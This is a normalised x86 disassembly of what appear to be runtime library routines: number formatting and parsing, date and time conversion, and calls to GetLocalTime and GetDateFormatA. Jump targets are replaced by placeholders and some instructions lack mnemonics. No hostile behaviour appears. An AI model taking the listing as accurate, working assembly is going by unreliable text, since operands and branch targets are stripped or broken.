call sub_404544
mov eax [ ebp - 0x4 ]
call sub_4041b8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_408930
mov edx esi
xchg edx eax
call sub_404544
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408dfc
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408e40
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409114
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408f3f
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408f49
call sub_408f3f
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408dfc
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408fa5
call sub_408f3f
call sub_408f36
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408f36
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408dfc
retn
xor ecx ecx
sub_408fe1
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408f36
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408f36
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_409046
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40909a
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408fe1
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_409114
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_409141
jmp r-xdata
call sub_409263
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_409141
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402c80
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_409263
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409340
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4093f7
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409402
neg edx
mov ecx esi
call sub_409402
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4093f7
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_40941e
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402c80
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409402
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_40941e
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409454
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408e40
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403fe8
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409484
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408e40
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403fe8
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4094d0
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043b8
mov edx esp
xor ecx ecx
call sub_409340
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4094fc
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043b8
mov edx esp
xor ecx ecx
call sub_409340
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409544
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409588
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4095f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_409588
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407a84
sub_409638
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409544
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407a68
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407a68
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407a68
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409694
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_4096d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409694
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409798
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_4096d0
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407a84
sub_4097c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409544
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407a68
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407a68
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407a68
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409694
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409914
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_4097c8
pop esi
pop ecx
pop ebp
retn 0x8
sub_409934
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_409544
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40995c
add esp 0xffffffe0
lea eax [ esp + 0x8 ]
push eax
call GetLocalTime
mov cx [ esp + 0xe ]
mov dx [ esp + 0xa ]
mov ax [ esp + 0x8 ]
call sub_409798
fstp [ esp + 0x18 ]
fwait
mov ax [ esp + 0x16 ]
push eax
mov cx [ esp + 0x18 ]
mov dx [ esp + 0x16 ]
mov ax [ esp + 0x14 ]
call sub_4095f8
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_4099c0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028e0
sub_409a04
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4041b8
mov edx eax
mov eax ebx
call sub_4099c0
pop ecx
pop ebx
pop ebp
retn
sub_409a24
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408930
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4099c0
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409a70
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409a9c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409914
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409ad4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409638
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409b14
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409c62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403ef8
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f90
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409c69
lea eax [ ebp - 0x118 ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404168
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4041b8
mov edx eax
mov eax [ ebx ]
call sub_40c058
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c1cc
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404418
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c168
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_4040f0
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c1cc
mov ecx eax
mov eax ebx
mov edx esi
call sub_403fe8
sub_409c7c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409d5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403ef8
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f90
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f90
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409d61
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404168
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4041b8
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404418
sub_409d84
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a505
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a50c
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403f1c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c24c
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c22c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4099c0
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c24c
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_4099c0
pop ecx
mov al [ eax + lookup_table_409e67 ]
jmp [ eax * 4 + jump_table_409ea0 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409a70
pop ecx
push ebp
call sub_409a9c
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409a70
pop ecx
push ebp
